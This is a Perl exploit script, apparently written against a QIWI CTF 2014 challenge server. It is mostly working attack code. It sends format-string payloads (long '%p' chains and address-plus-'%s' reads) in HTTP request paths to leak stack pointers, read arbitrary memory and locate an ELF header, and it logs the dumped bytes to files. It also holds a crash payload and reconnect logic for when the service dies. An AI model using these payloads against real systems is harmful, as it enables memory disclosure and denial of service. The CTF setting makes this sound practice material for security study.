#!/usr/bin/perl

use strict;
use IO::Socket::SSL;

$| = 1;
our $server_alive = 1;
my $sock;
my $write;
my $read;
my $payload_kill;
my $payload;
my $payload_read;
our $payload_memleak;
my $buf;
our @addrs;
my $offset;

$payload_kill = "POST /%s HTTP/1.0\nConnection: Keep-Alive\n\n";
$payload_memleak =
'GET ' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 

" HTTP/1.0\nConnection: Keep-Alive\nContent-Length: 22\n\nHello worldHello world";

sub do_sock() {
	my $sock;
	our $server_alive;

	while (!defined($sock = IO::Socket::SSL->new("qiwictf2014.ru:8447"))) {
		print "[!] Can not create socket, may be banned! I'm going to sleep about 10 seconds\n";
		sleep 10;
	}

	print "[+] Create new socket!\n";
	$server_alive = 1;

	return $sock;
}

sub do_write() {
	my $sock = $_[0];
	my $mess = $_[1];

	my $ret;
	$ret = syswrite($sock, $mess);

	print "[+] Write payload to socket $ret bytes!\n";

	return $ret;
}

sub do_read() {
	my $sock = $_[0];
	my $read;
	my $buf;

	while ($read = sysread($sock, my $data, 1024) )
	{
		$buf .= $data;
		last if $buf =~ m/ not found :\(/mg;
	}

	if ($read == 0 && $buf eq "") {
		print "[!] Can not read from socket, may be socket is died!\n";
		$server_alive = 0;
		return undef;
	}

	print "BUF: $buf\n";
	if ($buf =~ m/^HTTP\/1\.1\s501\sNot\sImplemented/gim) {
		print "[!] While read socket return status 501\n";
		return -1;
	} elsif ($buf =~ m/^HTTP\/1\.1\s400\sBad\sRequest/gim) {
		print "[!] While read socket return status 400\n";
		return -1;
	}

	$buf =~ m/Page:\s(.+)\snot\sfound\s:\($/sm;

	my $string = $1;
	if (!defined($string)) {
		print "[!] While read socket i can not find \"Page: ... not found :(\"\n";
		print $buf,"\n";
		return -1;
	}

	print "[+] Read " . length($string) . " bytes from payload in socket!\n";
	return $string;
}

sub do_memleak() {
	my $sock = $_[0];
	our $payload_memleak;
	our @addrs;

	print "[+] Doing memleak\n";

	$write = &do_write($sock, $payload_memleak);
	$buf = &do_read($sock);

	@addrs = split /0x/, $buf;

#	if ($addrs[2] == 70257025) {
#		print "[!] Something wrong with offset in \@addrs!\n";
#	}
}

sub do_payload_memread() {
	my $addr = $_[0];
	my $hexval;
	my $payload;

	$hexval = sprintf("%x", $addr);
	if ($hexval eq "" || length($hexval) <= 6) {
		print "[-] Wrong param for do_memread(): $addr\n";
		return -1;
	}

	$payload = "GET " . pack("I*", $addr) . '%x%x///%s' . " HTTP/1.0\nConnection: Keep-Alive\nContent-Length: 22\n\nHello worldHello world";
	print "[+] Generate read payload for 0x$hexval\n";

	return $payload;
}

sub do_memread() {
	my $sock = $_[0];
	my $addr = $_[1];

	my $payload;
	my $read;
	my $write;
	our $server_alive;

	my $hexval = sprintf("%x", $addr);

	$payload = &do_payload_memread($addr);
	if ($payload == -1) {
		return -2;
	}

	$write = &do_write($sock,$payload);
	$read = &do_read($sock);

	return $read;

}

# create sock and do meamleak
$sock = &do_sock();
&do_memleak($sock);

my $val;
my $check_base;

for (0..255) {
	my $ch = $_;
	print "[+] Check symbol => $_ => " . sprintf("%x", $_) . "\n";
	my $query;
	$query = "GET " . pack("I*", $ch) . '%x%x///%x' . " HTTP/1.0\nConnection: Keep-Alive\nContent-Length: 22\n\nHello worldHello world";
	print "QUERY: $query\n";
	&do_write($sock,$query);
	$read = &do_read($sock);
	if ($server_alive == 0 && !defined($read)) {
		print "[!] Bad symbol => $_ " . sprintf ("%x", $_) . "\n";
		sleep 1;
		$sock = &do_sock();
#		&do_memleak($sock);
		next;
	} elsif ($read == -1) {
		print "[!] Bad symbol => $_ " . sprintf ("%x", $_) . "\n";
		print "[!] Server return error!\n";
		$sock = &do_sock();
#		&do_memleak($sock);
		next;
	}
	print "[+] Got: $read\n\n";
#	print "$_ => $addrs[$_]","\n";
}

#exit 1;
#my $sub = 1228800;
my $sub = 0x100;
for (my $i = 2; $i<=2; $i++) {

	sleep 1;
	$offset = 0;

	my $addr = $addrs[$i];
	$addr =~ s/\(nil\)//g;
	print "\n[+] Trying $i => $addr\n";

	$val = hex($addr);

	$check_base = $val & 0xfffff000;
#	$check_base = $val - 5;

	while (1) {
		print "\n";


		$val = $check_base + $offset;

		if (($val & 0x000000ff) == 0x0a || ($val & 0x000000ff) == 0x00) {
#			$val += 4;
			$val += 1;

		}

		$buf = &do_memread($sock, $val);
		if ($server_alive == 0 && !defined($buf)) {
			print "[-] Payload kill server: $i => $addr, offset = $offset\n\n";

			sleep 1;
			$sock = &do_sock();
			&do_memleak($sock);
			last;
		} elsif ($buf == -1) {
			print "[-] Can not read memory! Server return error\n";
			$offset += $sub;
			$sock = &do_sock();
			next;
		} elsif ($buf == -2) {
			print "[-] Not correct addres\n";
			last;
		}


		$buf =~ m/\/\/\/(.+)/sm;
		my $string = $1;
		if (!defined($string) ) {
			print "[+] Got: Nothing LUZZZER!\n";
		} else {
			if ($string =~ m/ELF/ ) {
				my $e_type_addr = ($val & 0xfffffff0) + 0x10;
				my $e_type_addr_hex = sprintf("%08x", $e_type_addr);
				my $offset_hex = sprintf("%08x", $offset);

				open FILE, ">>elf.txt";
				print FILE "[+] Find ELF [$i] => [$addr],  offset = 0x$offset_hex\n";
				close FILE;
				print "[+] Got: " .unpack ("H*", $string) . "\n";

				print "[+] Find ELF [$i] => [$addr],  offset = 0x$offset_hex\n";
				print "[+] Trying get E_TYPE from ELF on 0x$e_type_addr_hex\n";

				my $e_type = &do_memread($sock, $e_type_addr);
				if ($server_alive == 0 && !defined($e_type)) {
					print "[-] Payload kill server when i try read 0x$e_type_addr_hex\n";
					$sock = &do_sock();
					&do_memleak($sock);
				} elsif ($e_type == -1) {
					print "[-] Imposible read from address 0x$e_type_addr_hex\n";
				} elsif ($e_type == -2) {
					print "[-] Incorrect address for reading 0x$e_type_addr_hex\n";
				} else {
					print "[+] Got " . length($e_type) . " bytes : " . unpack("H*", $e_type) . "\n";
				}
				last;
			}
			print "[+] Got: " .unpack ("H*", $1) . "\n";
			open DATA, ">data.txt";
			print DATA $string,"\n\n";
			close DATA;
#			undef($1);
		}
		undef($buf);

		$offset += $sub;
	}

}

__END__

# Цикл пробегается по указанным адресам и дампит их
for (my $i = 877; $i<=908; $i++) {

	sleep 2;

	my $addr = $addrs[$i];
	$addr =~ s/\(nil\)//g;
	print "\n[+] Trying $i => $addr\n";

	my $val = hex($addr);

	if (($val & 0x000000ff) == 0x0a || ($val & 0x000000ff) == 0x00) {
		$val++;
	}

	$payload = &do_payload_memread($val);
	if ($payload == -1) {
		next;
	}

	$write = &do_write($sock, $payload);
	$buf = &do_read($sock);
	if ($server_alive == 0 && !defined($buf)) {
		print "[-] Payload kill server: $i => $addr\n";

		open FILE, ">>stats7.txt";
		print FILE "[-] Payload kill server: $i => $addr\n";
		close FILE;

		sleep 1;
		$sock = &do_sock();
		&do_memleak($sock);
		next;
	}

	if ($buf == -1) {
		$sock = &do_sock();
		next;
	}
	print "[+] Got: " . unpack("H*", $buf) . "\n";

}
